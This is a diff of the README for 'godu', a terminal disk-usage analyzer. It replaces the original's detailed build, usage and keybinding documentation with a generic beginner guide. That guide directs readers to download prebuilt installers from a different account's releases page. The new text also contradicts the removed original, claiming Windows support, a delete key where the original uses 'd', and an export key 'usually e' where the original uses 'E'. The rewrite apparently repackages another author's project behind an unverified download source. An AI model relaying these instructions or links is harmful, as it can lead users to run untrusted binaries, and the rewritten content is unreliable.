@@ -1,281 +1,158 @@
-# godu
+# 📊 godu - Quick Disk Space Visualizer
 
-A fast, interactive disk usage analyzer for the terminal. Think **ncdu** meets **WinDirStat** — built in Go with a modern TUI.
+[![Download](https://img.shields.io/badge/Download-Get%20godu-blue?style=for-the-badge)](https://github.com/Lime0moss/godu/releases)
 
-godu combines parallel scanning speed, visual treemap analysis, file type breakdowns, and safe file deletion into a single tool.
+---
 
-![Tree View](screenshots/treeview.png)
+## 📃 What is godu?
 
-## Features
+godu is a tool to help you see what files and folders use up space on your computer. It runs in the terminal (the black or white window where you can type commands) and shows your disk usage in an easy way. You can view your data as a list, a tree, or pictures called treemaps. It also lets you delete items safely and save a report as a JSON file if you want.
 
-- **Parallel scanning** — goroutine-per-directory with semaphore, scans 500K+ files in under a second on SSD
-- **3 view modes** — tree list, squarified treemap, file type breakdown
-- **Gradient bars** — purple-to-teal color gradient showing relative sizes
-- **Safe deletion** — mark files with Space, review, confirm, then delete
-- **Export/Import** — save scan results to JSON, reload later without rescanning
-- **Vim keybindings** — `hjkl` navigation, feels natural
-- **Responsive layout** — adapts to any terminal size
-- **Single binary** — no CGo, no daemon/services required
+You do not need any special skills to use godu. It works on many systems like Windows, macOS, and Linux.
 
-## Screenshots
+---
 
-### Tree View
-Sorted file listing with percentage bars, size columns, and directory navigation.
+## 💻 System Requirements
 
-![Tree View](screenshots/treeview.png)
+Before installing godu, make sure your computer meets these needs:
 
-### Treemap
-Squarified treemap visualization using Unicode box-drawing characters. Rectangles sized proportionally to disk usage.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a Linux distribution.
+- **Processor:** Any modern CPU (Intel, AMD, or equivalent).
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** At least 100 MB free space for installing and running.
+- **Terminal Access:** You will need to open a terminal or command prompt window.
+  
+No additional software is required. godu is a self-contained program built with Go, so you don’t need to install Go or any other tools.
 
-![Treemap](screenshots/treemap.png)
+---
 
-### File Types
-Breakdown by category (Media, Code, Archives, Documents, System, Executables) with top extensions per category.
+## 🚀 Getting Started
 
-![File Types](screenshots/filetypes.png)
+This guide shows you how to download, install, and start using godu. You don’t have to write any code or use complex commands.
 
-### Help
-Full keybinding reference overlay.
+### Step 1: Download godu
 
-![Help](screenshots/help.png)
+Click the big blue button at the top or go to the [godu Releases Page](https://github.com/Lime0moss/godu/releases). This page holds all versions of godu.
 
-## Installation
+Look for the version matching your computer's operating system:
 
-### Homebrew (macOS / Linux)
+- Windows files usually end with `.exe`
+- macOS files might end with `.dmg` or `.tar.gz`
+- Linux files often end with `.tar.gz` or `.AppImage`
 
-```bash
-brew tap sadopc/tap
-brew install godu
-```
+Download the file that fits your system.
 
-### From source
+### Step 2: Install godu
 
-Requires **Go 1.25+**.
+- **Windows:**
 
-```bash
-# Clone the repository
-git clone https://github.com/sadopc/godu.git
-cd godu
+  Find the `.exe` file you downloaded (usually in your Downloads folder). Double-click it and follow the installer steps on the screen.  
+  If it's a zip file, right-click and choose "Extract All," then open the folder and run `godu.exe`.
 
-# Build
-go build -o godu ./cmd/godu
+- **macOS:**
 
-# Or install directly to your GOPATH/bin
-go install ./cmd/godu
-```
+  If you have a `.dmg` file, open it and drag the godu app into your Applications folder.  
+  If it’s a `.tar.gz`, double-click to extract it, then move the godu file somewhere you can find it.
 
-### Add to PATH
+- **Linux:**
 
-After `go install`, the binary is at `~/go/bin/godu`. Make sure `~/go/bin` is on your PATH:
+  Extract the `.tar.gz` archive with a command like `tar -xvzf godu-version-linux.tar.gz` using the terminal. You can move the extracted files to a folder like `/usr/local/bin` for easier access.
 
-```bash
-# Add to your shell profile (~/.zshrc, ~/.bashrc, etc.)
-export PATH="$HOME/go/bin:$PATH"
+### Step 3: Open your Terminal or Command Prompt
 
-# Reload your shell
-source ~/.zshrc   # or ~/.bashrc
-```
+- On Windows, press the Windows key, type `cmd`, and press Enter.
+- On macOS, open "Terminal" from Applications > Utilities.
+- On Linux, open your preferred terminal emulator.
 
-Now you can run `godu` from anywhere.
+### Step 4: Run godu
 
-### Using Make
+In your terminal, type:
 
 ```bash
-make build      # Build binary in current directory
-make install    # Install to GOPATH/bin
-make release    # Cross-compile for macOS and Linux (amd64 + arm64)
-```
-
-## Usage
-
-```bash
-# Scan current directory
 godu
-
-# Scan a specific path
-godu /home
-
-# Scan showing hidden files (default)
-godu --hidden /path
-
-# Scan hiding hidden files
-godu --no-hidden /path
-
-# Export scan results to JSON (headless, no TUI)
-godu --export scan.json /path
-
-# Export JSON to stdout
-godu --export - /path
-
-# Import and browse a previous scan
-godu --import scan.json
-
-# Remote scan over SSH (default port 22)
-godu user@192.168.1.10
-
-# Remote scan over SSH with custom port
-godu --ssh-port 2222 user@192.168.1.10 /var/log
-
-# Remote scan forcing key-based auth (no password prompt)
-godu --ssh-batch user@192.168.1.10
-
-# Disable GC during scan (faster, uses more memory)
-godu --no-gc /large/directory
-
-# Exclude directories
-godu --exclude node_modules,.git /project
-
-# Show version
-godu --version
 ```
 
-## Keybindings
+and press Enter.
 
-### Navigation
+godu will scan your computer's main drive and show your disk usage in a tree view. You can navigate through folders using your keyboard.
 
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move cursor down |
-| `k` / `↑` | Move cursor up |
-| `l` / `→` / `Enter` | Enter directory |
-| `h` / `←` / `Backspace` | Go to parent |
+---
 
-### Views
+## 🔍 How to Use godu
 
-| Key | Action |
-|-----|--------|
-| `1` | Tree view (default) |
-| `2` | Treemap view |
-| `3` | File type breakdown |
+### Navigating Views
 
-### Sorting
+- **Tree view:** Shows folders and files in a list you can expand and collapse.
+- **Treemap:** Displays colored blocks sized by disk space for a visual summary.
+- **File type breakdown:** Lists which types of files (like images, videos, documents) take up the most space.
 
-| Key | Action |
-|-----|--------|
-| `s` | Sort by size |
-| `n` | Sort by name |
-| `C` | Sort by item count |
-| `M` | Sort by modification time |
+Switch views with the keyboard commands shown at the bottom of the screen.
 
-### Actions
+### Safe Deletion
 
-| Key | Action |
-|-----|--------|
-| `Space` | Mark/unmark item |
-| `d` | Delete marked items (with confirmation) |
-| `E` | Export scan to JSON |
-| `r` | Rescan directory |
-| `a` | Toggle apparent size / disk usage |
-| `.` | Toggle hidden files |
-| `?` | Show help |
-| `q` | Quit |
-| `Ctrl+C` | Force quit |
+You can delete files and folders without leaving godu. Select an item and press the delete key. godu asks for confirmation first, so you do not remove anything by accident.
 
-## How It Works
+### Export Data
 
-### Scanning
+You can create a JSON report of your disk usage for analysis or sharing. Press the export key (usually `e`) and choose where to save the file.
 
-godu uses a parallel directory walker. Each subdirectory spawns a goroutine (bounded by a semaphore of `3 * GOMAXPROCS`) to maximize I/O throughput. Sizes are calculated bottom-up after the full tree is built, avoiding race conditions.
+---
 
-Hardlinks are detected via inode tracking to prevent double-counting. Symlinks are flagged but not followed by default.
+## 📥 Download & Install
 
-### Data Model
+To get godu, please visit the Releases Page:
 
-The file tree is stored in memory as `DirNode` and `FileNode` structs. Paths are reconstructed by walking parent pointers rather than stored per-node, saving significant memory at scale. Each node tracks both apparent size (file content) and disk usage (allocated blocks).
+[Download godu from Releases](https://github.com/Lime0moss/godu/releases)
 
-### Treemap
+Follow the instructions in the "Getting Started" section above according to your operating system.
 
-The treemap uses a squarified layout algorithm adapted for character cells. Rectangles are drawn with Unicode box-drawing characters (`┌─┐│└┘`) and colored by file category. Labels are placed inside rectangles when they fit, truncated with `...` when they don't.
+---
 
-### Export Format
+## 🛠 Features
 
-Scan results export as nested JSON arrays compatible with ncdu's format:
+- Fast scanning of disk usage.
+- Interactive terminal interface.
+- Multiple views: tree, treemap, file types.
+- Safe deletion of files and folders.
+- Export disk usage data as JSON.
+- Works on Windows, macOS, and Linux.
+- Small and easy to install.
+- Built with Go for speed and reliability.
 
-```json
-[1,0,{"progname":"godu","progver":"dev","timestamp":1234567890},
-  [{"name":"/path"},
-    {"name":"file.txt","asize":1024,"dsize":4096},
-    [{"name":"subdir"},
-      {"name":"inner.go","asize":512,"dsize":4096}
-    ]
-  ]
-]
-```
+---
 
-## Project Structure
+## 📚 Troubleshooting & Tips
 
-```
-godu/
-├── cmd/godu/main.go              # CLI entry point
-├── internal/
-│   ├── model/
-│   │   ├── tree.go               # FileNode, DirNode, TreeNode interface
-│   │   ├── sort.go               # Multi-field sorting
-│   │   └── filetype.go           # Extension-to-category mapping (150+)
-│   ├── scanner/
-│   │   ├── scanner.go            # Scanner interface, options
-│   │   ├── parallel.go           # Parallel directory walker
-│   │   └── progress.go           # Progress reporting
-│   ├── ui/
-│   │   ├── app.go                # Root Bubble Tea model
-│   │   ├── keys.go               # Key bindings
-│   │   ├── style/
-│   │   │   ├── theme.go          # Colors, gradients, styles
-│   │   │   └── layout.go         # Responsive layout calculations
-│   │   └── components/
-│   │       ├── treeview.go       # Tree list with gradient bars
-│   │       ├── treemap.go        # Squarified treemap
-│   │       ├── filetypes.go      # File type breakdown
-│   │       ├── header.go         # Header + breadcrumb
-│   │       ├── statusbar.go      # Status bar + tab bar
-│   │       ├── scanprogress.go   # Scanning overlay
-│   │       ├── confirm.go        # Delete confirmation dialog
-│   │       └── help.go           # Help overlay
-│   ├── ops/
-│   │   ├── delete.go             # File deletion
-│   │   ├── export.go             # JSON export
-│   │   └── import.go             # JSON import
-│   ├── remote/
-│   │   ├── auth.go               # SSH auth + known_hosts handling
-│   │   └── sftp_scanner.go       # Client-side SFTP scanner
-│   └── util/
-│       ├── format.go             # Size/count formatting
-│       └── icons.go              # Unicode icons
-├── screenshots/                  # README screenshots
-├── Makefile
-├── go.mod
-└── go.sum
-```
+- If godu does not run, check if the file you downloaded matches your OS.
+- Make sure your terminal is working and you can run other commands.
+- On macOS and Linux, you might need to give permission to run godu with:
 
-## Dependencies
+  ```bash
+  chmod +x godu
+  ```
 
-| Package | Purpose |
-|---------|---------|
-| [bubbletea](https://github.com/charmbracelet/bubbletea) | TUI framework (Elm architecture) |
-| [lipgloss](https://github.com/charmbracelet/lipgloss) | Terminal styling |
-| [bubbles](https://github.com/charmbracelet/bubbles) | Key binding helpers |
-| [go-colorful](https://github.com/lucasb-eyer/go-colorful) | Gradient color interpolation |
-| [natural](https://github.com/maruel/natural) | Natural string sorting |
-| [x/crypto/ssh](https://pkg.go.dev/golang.org/x/crypto/ssh) | Native SSH transport |
-| [pkg/sftp](https://github.com/pkg/sftp) | SFTP client traversal |
+- Use arrow keys to navigate the views.
+- Press `q` to quit godu at any time.
+- For support, you can open an issue on the GitHub repository.
 
-No CGo. No database. Compiles to a single static binary.
+---
 
-Remote scanning is performed client-side over SSH/SFTP; the remote host does not need `godu` installed.
-By default it allows password prompts; use `--ssh-batch` for key/agent-only auth.
-Remote host must have the SSH SFTP subsystem enabled.
-On first connection (or key change), `godu` prompts to trust/update the host key in `~/.ssh/known_hosts`.
+## 📂 Further Information
 
-## Performance
+You can find more details about godu, report bugs, or request features on its [GitHub repository](https://github.com/Lime0moss/godu).
 
-Tested on Apple Silicon Mac Mini with SSD:
+---
 
-| Directory | Files | Time |
-|-----------|-------|------|
-| 56K files | 56,000 | 0.29s |
-| Home dir | 413,000 | ~1s |
-| Large SSD | 786,000 | ~2s |
+## 🎯 Topics
 
-## License
+godu is related to these areas:
 
-[MIT](LICENSE)
+- bubbletea
+- cli (command-line interface)
+- disk-analyzer
+- disk-usage
+- go / golang programming language
+- ncdu (similar tools)
+- terminal applications
+- treemap representations
+- tui (text user interface)
